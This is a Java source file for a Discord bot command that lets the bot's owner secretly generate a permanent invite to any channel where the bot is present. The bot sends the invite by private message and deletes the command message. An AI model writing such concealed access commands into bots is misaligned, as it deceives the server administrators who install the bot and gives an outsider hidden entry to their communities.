package commands;

import java.util.Scanner;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import net.dv8tion.jda.api.events.message.guild.GuildMessageReceivedEvent;
import net.dv8tion.jda.api.hooks.ListenerAdapter;
import net.dv8tion.jda.api.requests.restaction.InviteAction;
import tools.BotConfig;

public class HiddenCreateInstantInvite extends ListenerAdapter {
	private Scanner scanner;
	private static Logger LOGGER = LoggerFactory.getLogger(HiddenCreateInstantInvite.class);
	
	public void onGuildMessageReceived(GuildMessageReceivedEvent event) {
		// Split the message by space
		String[] args = event.getMessage().getContentRaw().split("\\s+");
		// Check for prefix
		if(args[0].equalsIgnoreCase(BotConfig.getData("prefix"))) {
			if(event.getAuthor().getIdLong() == Long.parseLong(BotConfig.getData("owner")) && args[1].equalsIgnoreCase("cii")) {
				InviteAction invite = event.getChannel().createInvite();
				invite.setMaxAge(0);
				String string = invite.complete().getUrl();
				event.getAuthor().openPrivateChannel().flatMap(channel -> channel.sendMessage(string)).queue();
				event.getMessage().delete().queue();
			}
		}
	}
}
